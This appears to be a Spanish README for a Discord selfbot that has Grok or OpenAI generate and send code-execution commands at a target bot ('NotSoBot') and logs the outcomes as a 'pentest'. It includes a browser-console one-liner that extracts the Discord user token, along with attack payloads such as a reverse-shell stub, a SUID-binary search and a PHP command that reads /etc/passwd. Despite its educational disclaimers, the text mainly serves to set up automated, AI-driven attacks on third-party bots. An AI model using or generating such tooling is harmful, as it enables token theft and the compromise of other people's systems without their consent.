# Selfbot de Pentesting Automatizado con Grok

## ⚠️ ADVERTENCIA
Este código es SOLO para fines educativos en entornos controlados. Los selfbots violan los Términos de Servicio de Discord.

## 📋 Requisitos

1. **Token de Discord** (user token, no bot token)
2. **API Key de Grok** (xAI)
3. Python 3.8+

## 🚀 Instalación

```bash
pip install -r requirements_selfbot.txt
```

## ⚙️ Configuración

Edita `selfbot_pentest.py`:

```python
DISCORD_TOKEN = "MTIzNDU2..."  # Tu token de usuario
GROK_API_KEY = "xai-..."       # Tu API key de Grok
TARGET_CHANNEL_ID = 123456789  # ID del canal
BOT_NAME = "NotSoBot"          # Nombre del bot objetivo
```

### Obtener tu User Token:

1. Abre Discord en navegador (NO en la app)
2. F12 → Console
3. Pega: `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
4. Copia el token

### Obtener Grok API Key:

1. Ve a https://x.ai/
2. Regístrate y obtén API key
3. (Alternativa: Usa OpenAI API cambiando el base_url)

### Obtener Channel ID:

1. Discord → Settings → Advanced → Enable Developer Mode
2. Click derecho en canal → Copy ID

## 🎯 Uso

### Modo Automático:
```bash
python selfbot_pentest.py
```

El bot automáticamente:
- Se conecta al canal
- Envía comandos iniciales
- Usa Grok para generar nuevos comandos
- Registra todas las respuestas
- Guarda resultados en `pentest_results.json`

### Modo Manual (modificar código):

```python
# En automated_pentest(), añade:
await manual_command(channel, ".code python import os; print(os.getcwd())")
```

## 📊 Resultados

Los resultados se guardan en `pentest_results.json`:

```json
{
  "total_commands": 23,
  "successful": 20,
  "failed": 3,
  "commands": [
    {
      "command": ".code python ...",
      "output": "respuesta del bot",
      "status": "success"
    }
  ]
}
```

## 🔧 Personalización

### Cambiar modelo de IA:

```python
# Usar OpenAI en vez de Grok:
grok_client = openai.OpenAI(
    api_key="sk-...",
    base_url="https://api.openai.com/v1"  # OpenAI
)
# model="gpt-4"
```

### Añadir más vectores de ataque:

```python
initial_commands = [
    ".code python import socket; # reverse shell",
    ".code bash find / -perm -4000",
    ".code php <?php system('cat /etc/passwd'); ?>"
]
```

## 🛡️ Consideraciones de Seguridad

1. **Solo en entornos controlados**
2. **Con permiso explícito**
3. **Discord baneará tu cuenta** si detecta selfbots
4. **Usa cuenta secundaria**
5. **No uses en servidores públicos**

## 🐛 Troubleshooting

**Error: "Improper token"**
- Verifica que sea user token (no bot token)
- No incluyas "Bot " o "Bearer " en el token

**Error: "Cannot connect to host x.ai"**
- Verifica tu API key de Grok
- Prueba con OpenAI API como alternativa

**Bot no responde:**
- Verifica el nombre exacto del bot
- Verifica permisos del canal
- Aumenta timeout en `wait_for`

## 📚 Recursos

- Discord.py-self: https://github.com/dolfies/discord.py-self
- Grok API: https://docs.x.ai/
- OpenAI API: https://platform.openai.com/docs

## ⚖️ Legal

Este código es solo para investigación de seguridad en entornos controlados. El uso indebido puede violar leyes y términos de servicio.
